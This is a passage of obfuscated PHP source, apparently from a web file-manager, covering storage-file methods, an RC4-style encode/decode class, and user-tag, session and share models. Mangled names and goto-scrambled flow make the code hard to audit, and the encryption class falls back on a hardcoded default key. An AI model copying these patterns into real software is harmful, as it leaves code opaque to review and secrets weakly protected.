$b±²³…ƒß˜ = $a÷ó®™óÍß ? $eóíÂ“¤Ôœ[1234] . rawurlencode($E¹¸ªäÕÄ…) : $eóíÂ“¤Ôœ[43]; $C×®‹ãä÷÷ = $this->link($FÙ„®Ú–Ù³, $b±²³…ƒß˜); $this->fileOutLink($C×®‹ãä÷÷); } public function fileOutServer($dåˆÑ²ùÑß, $dëÚµ½Ú¯ª = false, $D…ñÖóåß¢ = false, $AÍ¦İ­¬¥˜ = '') { parent::fileOut($dåˆÑ²ùÑß, $dëÚµ½Ú¯ª, $D…ñÖóåß¢, $AÍ¦İ­¬¥˜); } public function fileOutImage($C˜µ–Şî×, $BÚ¦‹×µè = 250) { $cç¦¡Èîñ¿ = $this->link($C˜µ–Şî×, $_SERVER[çŞáÓæÚô‚Ô‡][1235] . $BÚ¦‹×µè); $this->fileOutLink($cç¦¡Èîñ¿); } public function fileOutImageServer($f¹®º¥›ŞŞ, $b­Ï‰‘¶Í = 250) { parent::fileOutImage($f¹®º¥›ŞŞ, $b­Ï‰‘¶Í); } public function hashMd5($A¿¨¿´Å‰) { $d ›ÁÅéé =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eóï›à¶İĞ = $this->objectMeta($A¿¨¿´Å‰); return isset($eóï›à¶İĞ[$d ›ÁÅéé[206]]) ? $eóï›à¶İĞ[$d ›ÁÅéé[206]] : !1; $e¢øõƒ„ß = $this->link($A¿¨¿´Å‰, $d ›ÁÅéé[1236]); } public function size($Fê¾ï„ƒÙÊ) { $cêèƒŠ²Š = $this->objectMeta($Fê¾ï„ƒÙÊ); return $cêèƒŠ²Š ? $cêèƒŠ²Š[$_SERVER[çŞáÓæÚô‚Ô‡][87]] : 0; } public function info($BÈİÌ¯ÚÚ) { if ($this->isFolder($BÈİÌ¯ÚÚ)) { return $this->folderInfo($BÈİÌ¯ÚÚ); } else { if ($this->isFile($BÈİÌ¯ÚÚ)) { return $this->fileInfo($BÈİÌ¯ÚÚ); } } return !1; } public function exist($EÎ¥…êÓá‰) { return $this->isFile($EÎ¥…êÓá‰) || $this->isFolder($EÎ¥…êÓá‰); } public function isFile($C²ÎİÒ’ç¡) { return !$this->isFolder($C²ÎİÒ’ç¡) && $this->objectMeta($C²ÎİÒ’ç¡); } public function isFolder($c‹¹éÅŸ§») { return $this->cacheMethod($_SERVER[çŞáÓæÚô‚Ô‡][232], $c‹¹éÅŸ§»); } protected function objectMeta($F¢Å¯áò¢©) { return $this->cacheMethod($_SERVER[çŞáÓæÚô‚Ô‡][233], $F¢Å¯áò¢©); } protected function _objectMeta($d®Ÿ¥÷Æ¨Œ) { $C»±‚ªˆ˜ =& $_SERVER[çŞáÓæÚô‚Ô‡]; list($bŞ£¶Øƒˆ¼, $DˆçÇÊ¢ê¼) = $this->bucketManager->stat($this->bucket, $d®Ÿ¥÷Æ¨Œ); if ($bŞ£¶Øƒˆ¼) { $bŞ£¶Øƒˆ¼[$C»±‚ªˆ˜[87]] = intval($bŞ£¶Øƒˆ¼[$C»±‚ªˆ˜[1223]]); } return $bŞ£¶Øƒˆ¼; } protected function _isFolder($DÛä‰˜‘È) { $c¾Îªê³ í =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($DÛä‰˜‘È == $c¾Îªê³ í[43] || $DÛä‰˜‘È == $c¾Îªê³ í[18]) { return !0; } list($C­‘ïÀÊçÊ, $Eà§ÜšÈ†) = $this->bucketManager->listFiles($this->bucket, trim($DÛä‰˜‘È, $c¾Îªê³ í[18]) . $c¾Îªê³ í[18], $c¾Îªê³ í[43], 1, $c¾Îªê³ í[18]); return !empty($C­‘ïÀÊçÊ[$c¾Îªê³ í[1222]]) || !empty($C­‘ïÀÊçÊ[$c¾Îªê³ í[1225]]) ? !0 : !1; } } goto AçÏ‡Ü¥õÉ; EÄ§­æŒ‘İ: class Mcrypt { public static $defaultKey = "\141\41\164\141\153\x41\72\144\x6c\155\x63\154\x64\105\166\x2c\x65"; public static function encode($eœøä–œä, $b¸‘ğšğÉæ = '', $D†œ®î˜¤ = 0, $a›ÌÃŠˆêÆ = '') { goto CªÓ„ĞÙäÉ; cï¹ºİÑä¸: for ($BŠã¾Ò…Ùî = 0; $BŠã¾Ò…Ùî <= 255; $BŠã¾Ò…Ùî++) { $fÜ³ğÁœ¦™[$BŠã¾Ò…Ùî] = ord($fÄâ½ÎòÆÉ[$BŠã¾Ò…Ùî % $d»„î«‘ì]); } $aÕêêÕÑéâ = range(0, 255); for ($bíºÜŸ‚–Ú = $BŠã¾Ò…Ùî = 0; $BŠã¾Ò…Ùî < 256; $BŠã¾Ò…Ùî++) { $bíºÜŸ‚–Ú = ($bíºÜŸ‚–Ú + $aÕêêÕÑéâ[$BŠã¾Ò…Ùî] + $fÜ³ğÁœ¦™[$BŠã¾Ò…Ùî]) % 256; $dÒ«­§ô³ = $aÕêêÕÑéâ[$BŠã¾Ò…Ùî]; $aÕêêÕÑéâ[$BŠã¾Ò…Ùî] = $aÕêêÕÑéâ[$bíºÜŸ‚–Ú]; $aÕêêÕÑéâ[$bíºÜŸ‚–Ú] = $dÒ«­§ô³; } goto CÁ°«¯Ğù÷; BÛƒô¤Œê¾: $f…Ï³¤Ùœ„ = substr($a›ÌÃŠˆêÆ, -$a‹§œØæô); $fÄâ½ÎòÆÉ = $a©Œìõ§´¤ . md5($a©Œìõ§´¤ . $f…Ï³¤Ùœ„); $d»„î«‘ì = strlen($fÄâ½ÎòÆÉ); goto fğËÏ©è¢¤; CÁ°«¯Ğù÷: $eÃùõ–ˆË¼ = $a¡Íå¥¬Ü×[43]; for ($bïÂöĞèµš = $bíºÜŸ‚–Ú = $BŠã¾Ò…Ùî = 0; $BŠã¾Ò…Ùî < $f¹•“‚Õ§¨; $BŠã¾Ò…Ùî++) { $bïÂöĞèµš = ($bïÂöĞèµš + 1) % 256; $bíºÜŸ‚–Ú = ($bíºÜŸ‚–Ú + $aÕêêÕÑéâ[$bïÂöĞèµš]) % 256; $dÒ«­§ô³ = $aÕêêÕÑéâ[$bïÂöĞèµš]; $aÕêêÕÑéâ[$bïÂöĞèµš] = $aÕêêÕÑéâ[$bíºÜŸ‚–Ú]; $aÕêêÕÑéâ[$bíºÜŸ‚–Ú] = $dÒ«­§ô³; $eÃùõ–ˆË¼ .= chr(ord($eœøä–œä[$BŠã¾Ò…Ùî]) ^ $aÕêêÕÑéâ[($aÕêêÕÑéâ[$bïÂöĞèµš] + $aÕêêÕÑéâ[$bíºÜŸ‚–Ú]) % 256]); } $eÃùõ–ˆË¼ = $f…Ï³¤Ùœ„ . str_replace($a¡Íå¥¬Ü×[913], $a¡Íå¥¬Ü×[43], base64_encode($eÃùõ–ˆË¼)); goto fºÌ÷¬®ƒî; CªÓ„ĞÙäÉ: $a¡Íå¥¬Ü× =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a‹§œØæô = 4; $b¸‘ğšğÉæ = md5($b¸‘ğšğÉæ ? $b¸‘ğšğÉæ : self::$defaultKey); goto b¾Æ×¹×“ù; fğËÏ©è¢¤: $eœøä–œä = sprintf($a¡Íå¥¬Ü×[1940], $D†œ®î˜¤ ? $D†œ®î˜¤ + time() : 0) . substr(md5($eœøä–œä . $eÂµˆÙ˜ä), 0, 16) . $eœøä–œä; $f¹•“‚Õ§¨ = strlen($eœøä–œä); $fÜ³ğÁœ¦™ = array(); goto cï¹ºİÑä¸; fºÌ÷¬®ƒî: $eÃùõ–ˆË¼ = str_replace(array($a¡Íå¥¬Ü×[293], $a¡Íå¥¬Ü×[18], $a¡Íå¥¬Ü×[913]), array($a¡Íå¥¬Ü×[421], $a¡Íå¥¬Ü×[80], $a¡Íå¥¬Ü×[101]), $eÃùõ–ˆË¼); return $eÃùõ–ˆË¼; goto eŒÙ†ö–«Å; b¾Æ×¹×“ù: $a©Œìõ§´¤ = md5(substr($b¸‘ğšğÉæ, 0, 16)); $eÂµˆÙ˜ä = md5(substr($b¸‘ğšğÉæ, 16, 16)); $a›ÌÃŠˆêÆ = $a›ÌÃŠˆêÆ ? $a›ÌÃŠˆêÆ : md5(microtime()); goto BÛƒô¤Œê¾; eŒÙ†ö–«Å: } public static function decode($fµ¯ŸÀ…›, $E°‡®ß¿šØ = '') { goto EËÉŠâ™èé; CŠ¯åÇœÈÃ: $CŞÀƒºÓ­ = $EõêÉçá³»[43]; for ($Dõè–ãÌº‡ = $câ‘Ş‘Ê¬¹ = $dÖŠö¥–ô• = 0; $dÖŠö¥–ô• < $aµ˜É‘ŠÎÖ; $dÖŠö¥–ô•++) { $Dõè–ãÌº‡ = ($Dõè–ãÌº‡ + 1) % 256; $câ‘Ş‘Ê¬¹ = ($câ‘Ş‘Ê¬¹ + $Dáæ¯Ùòƒ[$Dõè–ãÌº‡]) % 256; $Bò²Àõ´ = $Dáæ¯Ùòƒ[$Dõè–ãÌº‡]; $Dáæ¯Ùòƒ[$Dõè–ãÌº‡] = $Dáæ¯Ùòƒ[$câ‘Ş‘Ê¬¹]; $Dáæ¯Ùòƒ[$câ‘Ş‘Ê¬¹] = $Bò²Àõ´; $CŞÀƒºÓ­ .= chr(ord($fµ¯ŸÀ…›[$dÖŠö¥–ô•]) ^ $Dáæ¯Ùòƒ[($Dáæ¯Ùòƒ[$Dõè–ãÌº‡] + $Dáæ¯Ùòƒ[$câ‘Ş‘Ê¬¹]) % 256]); } $Aâˆèñ˜¸à = intval(substr($CŞÀƒºÓ­, 0, 10)); goto a“Š¬øØ–Ç; E„Î´ëÍ•°: for ($dÖŠö¥–ô• = 0; $dÖŠö¥–ô• <= 255; $dÖŠö¥–ô•++) { $d³£÷Ù¶¾[$dÖŠö¥–ô•] = ord($D²²œÓÏ³™[$dÖŠö¥–ô• % $eˆ‘˜®Ôá¥]); } $Dáæ¯Ùòƒ = range(0, 255); for ($câ‘Ş‘Ê¬¹ = $dÖŠö¥–ô• = 0; $dÖŠö¥–ô• < 256; $dÖŠö¥–ô•++) { $câ‘Ş‘Ê¬¹ = ($câ‘Ş‘Ê¬¹ + $Dáæ¯Ùòƒ[$dÖŠö¥–ô•] + $d³£÷Ù¶¾[$dÖŠö¥–ô•]) % 256; $Bò²Àõ´ = $Dáæ¯Ùòƒ[$dÖŠö¥–ô•]; $Dáæ¯Ùòƒ[$dÖŠö¥–ô•] = $Dáæ¯Ùòƒ[$câ‘Ş‘Ê¬¹]; $Dáæ¯Ùòƒ[$câ‘Ş‘Ê¬¹] = $Bò²Àõ´; } goto CŠ¯åÇœÈÃ; cĞ¨…¾ÕÛ: $E°‡®ß¿šØ = md5($E°‡®ß¿šØ ? $E°‡®ß¿šØ : self::$defaultKey); $d†‰Öøùå– = md5(substr($E°‡®ß¿šØ, 0, 16)); $CÀÁŠÁÄŸÃ = md5(substr($E°‡®ß¿šØ, 16, 16)); goto Eƒ†±Ô×¿; CÑ•Œë“Şë: $fµ¯ŸÀ…› = base64_decode(substr($fµ¯ŸÀ…›, $A‘·îĞê’)); $aµ˜É‘ŠÎÖ = strlen($fµ¯ŸÀ…›); $d³£÷Ù¶¾ = array(); goto E„Î´ëÍ•°; Eƒ†±Ô×¿: $aß¾ÍÒ ¸ = substr($fµ¯ŸÀ…›, 0, $A‘·îĞê’); $D²²œÓÏ³™ = $d†‰Öøùå– . md5($d†‰Öøùå– . $aß¾ÍÒ ¸); $eˆ‘˜®Ôá¥ = strlen($D²²œÓÏ³™); goto CÑ•Œë“Şë; EËÉŠâ™èé: $EõêÉçá³» =& $_SERVER[çŞáÓæÚô‚Ô‡]; $fµ¯ŸÀ…› = str_replace(array($EõêÉçá³»[421], $EõêÉçá³»[80], $EõêÉçá³»[101]), array($EõêÉçá³»[293], $EõêÉçá³»[18], $EõêÉçá³»[913]), $fµ¯ŸÀ…›); $A‘·îĞê’ = 4; goto cĞ¨…¾ÕÛ; a“Š¬øØ–Ç: if (($Aâˆèñ˜¸à == 0 || $Aâˆèñ˜¸à - time() > 0) && substr($CŞÀƒºÓ­, 10, 16) == substr(md5(substr($CŞÀƒºÓ­, 26) . $CÀÁŠÁÄŸÃ), 0, 16)) { return substr($CŞÀƒºÓ­, 26); } else { return $EõêÉçá³»[43]; } goto bš— ÉŠˆ; bš— ÉŠˆ: } } define($_SERVER[çŞáÓæÚô‚Ô‡][1941], 1); define($_SERVER[çŞáÓæÚô‚Ô‡][1942], 2); goto dï—˜„Å”ø; E³Ûöõå´®: class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\162\x2e\164\x61\x67\x4c\x69\163\164"; public $modelType = "\125\163\x65\x72\117\160\x74\151\157\x6e"; public $field = array("\x6e\141\155\x65", "\x73\x74\x79\x6c\145", "\x73\157\162\x74"); public function listData($BÊİ™Àò‰  = false, $CÊ…ÅÌ « = "\163\157\x72\164", $CÅê«Ó«ˆ = false) { return parent::listData($BÊİ™Àò‰ , $CÊ…ÅÌ «, $CÅê«Ó«ˆ); } public function remove($dƒïä³ÓÔŠ) { return parent::remove($dƒïä³ÓÔŠ); } public function add($DŒÓ³°á¶, $eĞÜÁãÁĞ = "\x6c\x61\x62\x65\x6c\x2d\x67\162\x65\x79\55\156\157\162\x6d\x61\x6c") { $CÓ·Æ¨»§Û =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($this->findByName($DŒÓ³°á¶)) { return !1; } $fãã¿’Ê…è = array($CÓ·Æ¨»§Û[395] => $DŒÓ³°á¶, $CÓ·Æ¨»§Û[446] => $eĞÜÁãÁĞ, $CÓ·Æ¨»§Û[2118] => $this->getSort($CÓ·Æ¨»§Û[255]) + 1); return parent::insert($fãã¿’Ê…è); } public function update($B´İ¿‚ˆª, $bÜ½Šù×ì) { $Eç®ï›•¼ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $F©ß•‰ãê = $this->listData($B´İ¿‚ˆª); $a²‰ñ„ÈìÚ = $this->findByName($bÜ½Šù×ì[$Eç®ï›•¼[38]]); if (!$F©ß•‰ãê || $a²‰ñ„ÈìÚ && $a²‰ñ„ÈìÚ[$Eç®ï›•¼[376]] != $F©ß•‰ãê[$Eç®ï›•¼[376]]) { return !1; } return parent::update($B´İ¿‚ˆª, $bÜ½Šù×ì); } public function moveTop($A²äï»“…) { $EØ¹áÒä‡É =& $_SERVER[çŞáÓæÚô‚Ô‡]; $FŞ·‹ìâè = parent::listData(); $F †ŠÛøÏ˜ = $this->getSort($EØ¹áÒä‡É[254]); foreach ($FŞ·‹ìâè as &$A‘±…˜»ºò) { if ($A‘±…˜»ºò[$EØ¹áÒä‡É[376]] == $A²äï»“…) { $A‘±…˜»ºò[$EØ¹áÒä‡É[2136]] = $F †ŠÛøÏ˜; continue; } $A‘±…˜»ºò[$EØ¹áÒä‡É[2136]] += 1; } unset($A‘±…˜»ºò); return parent::resetData($FŞ·‹ìâè); } public function moveBottom($eéõ½ˆÖ½ã) { $f›²ËÜéô¸ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $c¦¯¤İ¡œŞ = $this->getSort($f›²ËÜéô¸[255]) + 1; return parent::update($eéõ½ˆÖ½ã, array($f›²ËÜéô¸[2136] => $c¦¯¤İ¡œŞ)); } public function resetSort($BÃÇ™¾õ‰¤) { goto DÜé“Üõ; eòöÆ‘ìŸõ: unset($B–ù†‹ÒÆ); return parent::resetData($FÃˆÅ¾È†); goto bÀÔÍí³ä; DÜé“Üõ: $e°ˆñ¬ˆëœ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cÕ×Íä¡ŒÏ = array(); $BÃÇ™¾õ‰¤ = is_array($BÃÇ™¾õ‰¤) ? $BÃÇ™¾õ‰¤ : array(); goto aÂİÑÒÃ¨; aÂİÑÒÃ¨: for ($A»Ô˜Ëêî§ = 0; $A»Ô˜Ëêî§ < count($BÃÇ™¾õ‰¤); $A»Ô˜Ëêî§++) { $cÕ×Íä¡ŒÏ[$BÃÇ™¾õ‰¤[$A»Ô˜Ëêî§] . $e°ˆñ¬ˆëœ[43]] = $A»Ô˜Ëêî§ + 1; } $FÃˆÅ¾È† = parent::listData(); foreach ($FÃˆÅ¾È† as &$B–ù†‹ÒÆ) { $EÑÇÜŒµÈ = $cÕ×Íä¡ŒÏ[$B–ù†‹ÒÆ[$e°ˆñ¬ˆëœ[376]]]; $B–ù†‹ÒÆ[$e°ˆñ¬ˆëœ[2136]] = $EÑÇÜŒµÈ ? $EÑÇÜŒµÈ : $B–ù†‹ÒÆ[$e°ˆñ¬ˆëœ[2136]]; } goto eòöÆ‘ìŸõ; bÀÔÍí³ä: } private function getSort($CÇ¤ˆ„Òù³) { $E‘ŠãØœ¬ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $BÒ…ƒšóâœ = parent::listData(); $D„êŒÕ±Í… = array_to_keyvalue($BÒ…ƒšóâœ, $E‘ŠãØœ¬[43], $E‘ŠãØœ¬[2136]); if (!$D„êŒÕ±Í…) { $D„êŒÕ±Í… = array(0); } $dÖ¯çè»‘© = $CÇ¤ˆ„Òù³ == $E‘ŠãØœ¬[255] ? max($D„êŒÕ±Í…) : min($D„êŒÕ±Í…); return intval($dÖ¯çè»‘©); } } goto eë®ç›Ê¨; eÚ¨–¡ÓÜ†: class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\145\155\137\163\x65\x73\163\x69\x6f\156"; public function get($F¶ŸößîƒÓ) { $cæã°Ñ¨Â­ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $B¨Ú»¹ÙÈŒ = $this->where(array($cæã°Ñ¨Â­[2232] => $F¶ŸößîƒÓ))->find(); if (!is_array($B¨Ú»¹ÙÈŒ)) { return !1; } return $B¨Ú»¹ÙÈŒ[$cæã°Ñ¨Â­[701]]; } public function set($bÅ„Ê ™°, $aê–ø˜Î, $fê²ª§Ù…¢ = 3600) { $AÆñóÖƒœ¿ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $A¼‹³ºìã = array($AÆñóÖƒœ¿[2232] => $bÅ„Ê ™°, $AÆñóÖƒœ¿[2145] => $aê–ø˜Î, $AÆñóÖƒœ¿[2233] => $fê²ª§Ù…¢ + time()); if (Session::get($AÆñóÖƒœ¿[2234])) { $A¼‹³ºìã[$AÆñóÖƒœ¿[1443]] = Session::get($AÆñóÖƒœ¿[2234]); } else { $A¼‹³ºìã[$AÆñóÖƒœ¿[1443]] = 0; } if ($this->get($bÅ„Ê ™°)) { return $this->where(array($AÆñóÖƒœ¿[2232] => $bÅ„Ê ™°))->save($A¼‹³ºìã); } else { return $this->add($A¼‹³ºìã, array(), !0); } } public function remove($F¾™ôÅˆÓ„) { return $this->where(array($_SERVER[çŞáÓæÚô‚Ô‡][2232] => $F¾™ôÅˆÓ„))->delete(); } public function clearTimeout() { return $this->where($_SERVER[çŞáÓæÚô‚Ô‡][2235] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\x72\x65"; protected $dataAuto = array(array("\x6d\157\144\151\x66\x79\x54\151\155\x65", "\x74\x69\x6d\x65", "\x69\x6e\163\x65\162\164\x2c\x75\160\144\x61\x74\145", "\x66\x75\x6e\x63\164\151\x6f\x6e"), array("\143\x72\x65\x61\164\x65\124\x69\x6d\145", "\x74\151\x6d\x65", "\x69\x6e\x73\x65\x72\164", "\146\165\x6e\143\x74\151\x6f\x6e"), array("\x6f\160\164\x69\157\x6e\163", '', "\x69\156\x73\x65\162\164\54\165\160\x64\141\164\145\54\x73\145\154\145\x63\164", "\152\x73\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($eËùé°÷ù¥) { $FÓ‚­ÛĞ¨• =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a…¤Ãìâ° = isset($eËùé°÷ù¥[0]) ? $eËùé°÷ù¥[0] : !1; return array($FÓ‚­ÛĞ¨•[2236] => array(USER_ID, $FÓ‚­ÛĞ¨•[2237]), $FÓ‚­ÛĞ¨•[2185] => array($a…¤Ãìâ°, $FÓ‚­ÛĞ¨•[2238])); } protected function listSimple() { $eÌŒåÎÀÉ = array($_SERVER[çŞáÓæÚô‚Ô‡][1443] => USER_ID); $DÆæ„Ç¾× = $this->field($this->fieldList)->where($eÌŒåÎÀÉ)->select(); return $DÆæ„Ç¾× ? $DÆæ„Ç¾× : array(); } protected function getInfo($A½Ü­†Œ«¦, $E„Ñ¹ÉŸô“ = false) { $bÇÊí§ÃÈ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($E„Ñ¹ÉŸô“) { return $this->_getShareInfo(array($bÇÊí§ÃÈ[450] => $A½Ü­†Œ«¦)); } $A•¼©†«„¬ = $this->cacheFunctionGet($bÇÊí§ÃÈ[2239], $A½Ü­†Œ«¦); return $A•¼©†«„¬; } public function getInfoByHash($D¨¼óšÛµÍ) { return $this->_getShareInfo(array($_SERVER[çŞáÓæÚô‚Ô‡][452] => $D¨¼óšÛµÍ)); } public function getInfoByPath($b·¤ŞäîÈõ) { $D¬­æ§Ú«æ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $f—§ß¼‡ = array($D¬­æ§Ú«æ[1443] => USER_ID, $D¬­æ§Ú«æ[378] => $b·¤ŞäîÈõ); return $this->_getShareInfo($f—§ß¼‡); } public function getInfoBySourcePath($e¾êß±ò¹Ç) { $aŞÎÈ­ÑÌª =& $_SERVER[çŞáÓæÚô‚Ô‡]; $DÏÊ½Ñ¦¨„ = array($aŞÎÈ­ÑÌª[1443] => USER_ID, $aŞÎÈ­ÑÌª[1026] => $e¾êß±ò¹Ç); return $this->_getShareInfo($DÏÊ½Ñ¦¨„); } private function _getShareInfo($bîÅ©© ùİ) { goto Bã§Šä”³…; d‡Ãà¿ç•‹: $bîÅ©© ùİ = array($bî˜İø«ç[450] => $f·é»ÕŒ–[$bî˜İø«ç[450]]); $e…¢íñøÉÛ = $bî˜İø«ç[2240]; $c‰È† ¢´ = Model($bî˜İø«ç[548])->order($bî˜İø«ç[376])->field($e…¢íñøÉÛ)->where($bîÅ©© ùİ)->select(); goto dÒË¨â‘—; Bã§Šä”³…: $bî˜İø«ç =& $_SERVER[çŞáÓæÚô‚Ô‡]; $f·é»ÕŒ– = $this->where($bîÅ©© ùİ)->find(); if (!$f·é»ÕŒ–) { return !1; } goto d‡Ãà¿ç•‹; dÒË¨â‘—: if ($f·é»ÕŒ–[$bî˜İø«ç[378]] == $bî˜İø«ç[479]) { $f·é»ÕŒ–[$bî˜İø«ç[400]] = IO::info($f·é»ÕŒ–[$bî˜İø«ç[1026]]); } else { $f·é»ÕŒ–[$bî˜İø«ç[400]] = Model($bî˜İø«ç[1124])->pathInfo($f·é»ÕŒ–[$bî˜İø«ç[378]]); } $f·é»ÕŒ–[$bî˜İø«ç[2241]] = $c‰È† ¢´; return $f·é»ÕŒ–; goto a±ã—ãœ‘; a±ã—ãœ‘: } protected function getInfoAuth($DíÉ¢ÇÃ’) { $BÆ—ãÛ»¬µ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $b“£éÂ×âñ = $this->getInfo($DíÉ¢ÇÃ’); $b“£éÂ×âñ[$BÆ—ãÛ»¬µ[385]] = Model($BÆ—ãÛ»¬µ[465])->authMake($b“£éÂ×âñ[$BÆ—ãÛ»¬µ[2241]]); return $b“£éÂ×âñ; } protected function listData($E™”í°ë = null, $cá¡Ëœ†àÙ = 300) { $F®ÁÇˆÀ¥ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $B—ÇŠõšÑ¿ = array(array($F®ÁÇˆÀ¥[455] => array($F®ÁÇˆÀ¥[932], 0), $F®ÁÇˆÀ¥[457] => array($F®ÁÇˆÀ¥[932], 0), $F®ÁÇˆÀ¥[2242] => $F®ÁÇˆÀ¥[2199])); if ($E™”í°ë == $F®ÁÇˆÀ¥[1880]) { $B—ÇŠõšÑ¿ = array($F®ÁÇˆÀ¥[455] => 1); } else { if ($E™”í°ë == $F®ÁÇˆÀ¥[1015]) { $B—ÇŠõšÑ¿ = array($F®ÁÇˆÀ¥[457] => 1); } } $B—ÇŠõšÑ¿[$F®ÁÇˆÀ¥[1443]] = USER_ID; $cì–¶õÀ¥… = $this->where($B—ÇŠõšÑ¿)->selectPage($cá¡Ëœ†àÙ); return $cì–¶õÀ¥…; } protected function listToMe($A²Ó¬ğ™ñ¨ = 300) { goto f¾¬‚­ƒ»Î; D¢Ó‰ƒ¢î: $b®ØÚÀÆ = $this->field($eèËÜĞ¿Š)->where($eĞÃŒ‰¬ˆ’)->select(); foreach ($b®ØÚÀÆ as $FÄ’ëŸÕÚ => &$AùÇšÃÔĞ‘) { $AùÇšÃÔĞ‘[$E×¤²‚Æõ¿[2241]] = $F‰ˆ¯Àğ¹[$AùÇšÃÔĞ‘[$E×¤²‚Æõ¿[450]]]; } unset($AùÇšÃÔĞ‘); goto cİÒÈæŠ; dèÏ¦Û˜¿±: if ($c¶ßˆä¸¢î) { $eĞÃŒ‰¬ˆ’ = array(array($E×¤²‚Æõ¿[532] => SourceModel::TYPE_USER, $E×¤²‚Æõ¿[467] => USER_ID), array($E×¤²‚Æõ¿[532] => SourceModel::TYPE_GROUP, $E×¤²‚Æõ¿[467] => array($E×¤²‚Æõ¿[17], $c¶ßˆä¸¢î)), $E×¤²‚Æõ¿[2242] => $E×¤²‚Æõ¿[2199]); } $BİĞÒ…ˆ³ = Model($E×¤²‚Æõ¿[548])->where($eĞÃŒ‰¬ˆ’)->selectPage($A²Ó¬ğ™ñ¨); $F‰ˆ¯Àğ¹ = array_to_keyvalue_group($BİĞÒ…ˆ³[$E×¤²‚Æõ¿[363]], $E×¤²‚Æõ¿[450]); goto dÍÔ‹£›µĞ; dÍÔ‹£›µĞ: if (!$F‰ˆ¯Àğ¹) { return $BİĞÒ…ˆ³; } $eèËÜĞ¿Š = $E×¤²‚Æõ¿[2244]; $eĞÃŒ‰¬ˆ’ = array($E×¤²‚Æõ¿[450] => array($E×¤²‚Æõ¿[393], array_keys($F‰ˆ¯Àğ¹))); goto D¢Ó‰ƒ¢î; cİÒÈæŠ: $fÌÍ…¼¯ = array($E×¤²‚Æõ¿[2245] => $b®ØÚÀÆ, $E×¤²‚Æõ¿[2246] => $BİĞÒ…ˆ³[$E×¤²‚Æõ¿[360]]); return $fÌÍ…¼¯; goto c™ÂŠñêÀè; f¾¬‚­ƒ»Î: $E×¤²‚Æõ¿ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $c¶ßˆä¸¢î = Model($E×¤²‚Æõ¿[2243])->userGroupParents(USER_ID); $eĞÃŒ‰¬ˆ’ = array($E×¤²‚Æõ¿[532] => SourceModel::TYPE_USER, $E×¤²‚Æõ¿[467] => USER_ID); goto dèÏ¦Û˜¿±; c™ÂŠñêÀè: } protected function shareAdd($cŠòº¨’§°, $a…Ó•¬¶óÀ) { $C†Ì¾§ÕÜ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bòªèÊçÖµ = $this->_addShareData($cŠòº¨’§°, $a…Ó•¬¶óÀ); if (!empty($a…Ó•¬¶óÀ[$C†Ì¾§ÕÜ[2247]])) { $this->_shareAuthSet($bòªèÊçÖµ, $a…Ó•¬¶óÀ[$C†Ì¾§ÕÜ[2247]]); } $this->shareEventAdd($cŠòº¨’§°, $a…Ó•¬¶óÀ, $C†Ì¾§ÕÜ[1018]); return $bòªèÊçÖµ; } private function shareEventAdd($fõ¼ë‰‹Õ–, $CŒ°ê°Š, $A…ä³¯ò¯Ÿ = "\141\144\144") { goto b½™ŸŒ¼Ã±; cÕÃ èäŞŸ: return; goto aöÓ†¾ø¢Š; b½™ŸŒ¼Ã±: $CÍ›È·ñŸÒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($A…ä³¯ò¯Ÿ == $CÍ›È·ñŸÒ[1018]) { if ($CŒ°ê°Š[$CÍ›È·ñŸÒ[455]] == $CÍ›È·ñŸÒ[93]) { Model($CÍ›È·ñŸÒ[516])->eventShare($fõ¼ë‰‹Õ–, $CÍ›È·ñŸÒ[2248]); } if ($CŒ°ê°Š[$CÍ›È·ñŸÒ[457]] == $CÍ›È·ñŸÒ[93]) { Model($CÍ›È·ñŸÒ[516])->eventShare($fõ¼ë‰‹Õ–, $CÍ›È·ñŸÒ[2249]); } return; } $aõ¦ÜÉˆØ˜ = $this->getInfoByPath($fõ¼ë‰‹Õ–); goto aÛğ¥ŒÏ£‚; aÛğ¥ŒÏ£‚: $f·¡¡´í—Ç = $CÍ›È·ñŸÒ[2250]; if ($aõ¦ÜÉˆØ˜[$CÍ›È·ñŸÒ[455]] == $CÍ›È·ñŸÒ[479] && $CŒ°ê°Š[$CÍ›È·ñŸÒ[455]] == $CÍ›È·ñŸÒ[93]) { $f·¡¡´í—Ç = $CÍ›È·ñŸÒ[2248]; } if ($aõ¦ÜÉˆØ˜[$CÍ›È·ñŸÒ[455]] == $CÍ›È·ñŸÒ[93] && $CŒ°ê°Š[$CÍ›È·ñŸÒ[455]] == $CÍ›È·ñŸÒ[479]) { $f·¡¡´í—Ç = $CÍ›È·ñŸÒ[2251]; } goto BÎÒÔô¬¥Â; BÎÒÔô¬¥Â: if ($aõ¦ÜÉˆØ˜[$CÍ›È·ñŸÒ[457]] == $CÍ›È·ñŸÒ[479] && $CŒ°ê°Š[$CÍ›È·ñŸÒ[457]] == $CÍ›È·ñŸÒ[93]) { $f·¡¡´í—Ç = $CÍ›È·ñŸÒ[2249]; } if ($aõ¦ÜÉˆØ˜[$CÍ›È·ñŸÒ[457]] == $CÍ›È·ñŸÒ[93] && $CŒ°ê°Š[$CÍ›È·ñŸÒ[457]] == $CÍ›È·ñŸÒ[479]) { $f·¡¡´í—Ç = $CÍ›È·ñŸÒ[2252]; } Model($CÍ›È·ñŸÒ[516])->eventShare($fõ¼ë‰‹Õ–, $f·¡¡´í—Ç); goto cÕÃ èäŞŸ; aöÓ†¾ø¢Š: } private function _addShareData($EĞÆ÷ÔÇ¿‚, 